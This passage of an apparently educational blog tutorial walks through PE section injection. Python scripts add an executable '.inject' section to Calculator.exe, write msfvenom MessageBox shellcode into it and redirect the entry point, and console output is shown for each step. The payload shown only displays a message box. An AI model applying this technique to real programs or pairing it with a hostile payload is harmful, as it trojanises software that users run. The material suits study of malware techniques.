        <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">*</span> <span class="n">new_raw_size</span><span class="p">)</span>
    
    <span class="n">pe</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[Success]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="n">output_file</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">Section RVA:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">new_section_rva</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="k">return</span> <span class="n">new_section_rva</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">RED</span><span class="si">}</span><span class="s">Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;input.exe&gt; &lt;output.exe&gt; [size]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s">Examples:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">python </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> Calculator.exe Calc_section.exe</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">python </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> Calculator.exe Calc_section.exe 8192</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="nf">add_section</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="k">else</span> <span class="mh">0x1000</span><span class="p">)</span>
</pre></table></code></div></div><p><strong>Running the script:</strong></p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 add_section.py Calculator.exe Calculator_section.exe
</pre></table></code></div></div><div class="language-console nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="go">=== Adding New Section ===

[1] Configuration:
    Name: .inject
    Size: 4096 bytes (4KB)

[2] Alignment:
    Section: 0x1000
    File: 0x200

[3] Addresses:
    RVA: 0x9000
    Raw: 0x3400

[4] Characteristics: 0xE0000020
    EXECUTE + READ + WRITE + CODE

[5] Headers Updated:
    Sections: 7
    Image Size: 0xA000

[Success] Calculator_section.exe
Section RVA: 0x9000
</span></pre></table></code></div></div><p><strong>Verify with analyze_pe.py:</strong></p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 analyze_pe.py Calculator_section.exe
</pre></table></code></div></div><div class="language-console nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="go">=== Analyzing: Calculator_section.exe ===

[1] Entry Point: 0x18C0
    This is where the program starts executing
    Like the cookbook saying 'start reading at page 5'

[2] Sections (Chapters):
    Total sections: 7

    .text      at address 0x1000, size  5120 bytes
               ^ This section contains EXECUTABLE CODE
               The CPU will run instructions from here

    .rdata     at address 0x3000, size  5120 bytes
               ^ This section contains DATA (not code)
               Stores strings, numbers, or other information

    .data      at address 0x5000, size   512 bytes
               ^ This section contains DATA (not code)
               Stores strings, numbers, or other information

    .pdata     at address 0x6000, size   512 bytes
               ^ This section contains DATA (not code)
               Stores strings, numbers, or other information

    .rsrc      at address 0x7000, size   512 bytes
               ^ This section contains DATA (not code)
               Stores strings, numbers, or other information

    .reloc     at address 0x8000, size   512 bytes
               ^ This section contains DATA (not code)
               Stores strings, numbers, or other information

    .inject    at address 0x9000, size  4096 bytes
               ^ This section contains EXECUTABLE CODE
               The CPU will run instructions from here
</span></pre></table></code></div></div><p>Perfect! New section created and marked as executable.</p><h3 id="injecting-into-section"><span class="me-2">Injecting into Section</span><a href="#injecting-into-section" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div file="inject_section.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="inject_section.py"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">pefile</span>
<span class="kn">import</span> <span class="n">struct</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="k">class</span> <span class="nc">Colors</span><span class="p">:</span>
    <span class="n">HEADER</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[95m</span><span class="sh">'</span>
    <span class="n">BLUE</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[94m</span><span class="sh">'</span>
    <span class="n">CYAN</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[96m</span><span class="sh">'</span>
    <span class="n">GREEN</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[92m</span><span class="sh">'</span>
    <span class="n">YELLOW</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[93m</span><span class="sh">'</span>
    <span class="n">RED</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[91m</span><span class="sh">'</span>
    <span class="n">BOLD</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[1m</span><span class="sh">'</span>
    <span class="n">END</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span>

<span class="c1"># MessageBox shellcode from msfvenom (302 bytes, ExitProcess removed)
</span><span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x41\x51\x41\x50\x52\x48\x31\xd2\x65\x48\x8b</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x52\x60\x51\x48\x8b\x52\x18\x56\x48\x8b\x52\x20</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41\x51\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x18\x50\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x88\x41\x58\x41\x58\x5e\x59\x48\x01\xd0\x5a\x41</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xff\x5d\xe8\x0b\x00\x00\x00\x75\x73\x65\x72\x33</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c\x77\x26</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x07\xff\xd5\x49\xc7\xc1\x40\x00\x00\x00\xe8\x0f</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x00\x00\x43\x6f\x64\x65\x20\x49\x6e\x6a\x65</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x63\x74\x65\x64\x21\x00\x5a\xe8\x08\x00\x00\x00</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x48\x61\x63\x6b\x65\x64\x21\x00\x41\x58\x48\x31</span><span class="sh">"</span>
<span class="n">MESSAGEBOX_SHELLCODE</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc9\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9</span><span class="sh">"</span>

<span class="k">def</span> <span class="nf">inject_section</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">,</span> <span class="n">section_rva</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Inject shellcode into new section</span><span class="sh">"""</span>
    <span class="n">pe</span> <span class="o">=</span> <span class="n">pefile</span><span class="p">.</span><span class="nc">PE</span><span class="p">(</span><span class="n">input_file</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">=== Section Injection ===</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="n">original_entry</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="n">OPTIONAL_HEADER</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[1] Target:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Original entry: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">original_entry</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Section RVA: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">section_rva</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Build shellcode
</span>    <span class="n">shellcode</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">MESSAGEBOX_SHELLCODE</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[2] Shellcode:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> bytes</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Calculate JMP
</span>    <span class="n">jmp_from</span> <span class="o">=</span> <span class="n">section_rva</span> <span class="o">+</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="mi">5</span>
    <span class="n">jmp_offset</span> <span class="o">=</span> <span class="n">original_entry</span> <span class="o">-</span> <span class="n">jmp_from</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[3] JMP:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    From: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">jmp_from</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    To: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">original_entry</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Add JMP
</span>    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xE9</span><span class="sh">'</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;i</span><span class="sh">'</span><span class="p">,</span> <span class="n">jmp_offset</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[4] Total:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> bytes</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Write
</span>    <span class="k">for</span> <span class="n">section</span> <span class="ow">in</span> <span class="n">pe</span><span class="p">.</span><span class="n">sections</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">section</span><span class="p">.</span><span class="n">VirtualAddress</span> <span class="o">==</span> <span class="n">section_rva</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[5] Writing to:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}{</span><span class="n">section</span><span class="p">.</span><span class="n">Name</span><span class="p">.</span><span class="nf">decode</span><span class="p">().</span><span class="nf">strip</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="n">pe</span><span class="p">.</span><span class="nf">set_bytes_at_offset</span><span class="p">(</span><span class="n">section</span><span class="p">.</span><span class="n">PointerToRawData</span><span class="p">,</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">✓ Done!</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">break</span>
    
    <span class="c1"># Redirect entry
</span>    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[6] Entry:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">RED</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">original_entry</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> → </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">section_rva</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">pe</span><span class="p">.</span><span class="n">OPTIONAL_HEADER</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span> <span class="o">=</span> <span class="n">section_rva</span>
    
    <span class="n">pe</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">output_file</span><span class="p">)</span>
    <span class="n">pe</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[Success]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="n">output_file</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">RED</span><span class="si">}</span><span class="s">Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;input&gt; &lt;output&gt; &lt;section_rva&gt;</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s">Example:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">python </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> Calc_section.exe Calc_final.exe 0x9000</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="nf">inject_section</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
</pre></table></code></div></div><p><strong>Running the script:</strong></p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 inject_section.py Calculator_section.exe Calculator_final.exe 0x9000
</pre></table></code></div></div><div class="language-console nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="go">=== Section Injection ===

[1] Target:
    Original entry: 0x18C0
    Section RVA: 0x9000

[2] Shellcode: 300 bytes

[3] JMP:
    From: 0x9131
    To: 0x18C0

[4] Total: 305 bytes

[5] Writing to: .inject
    ✓ Done!

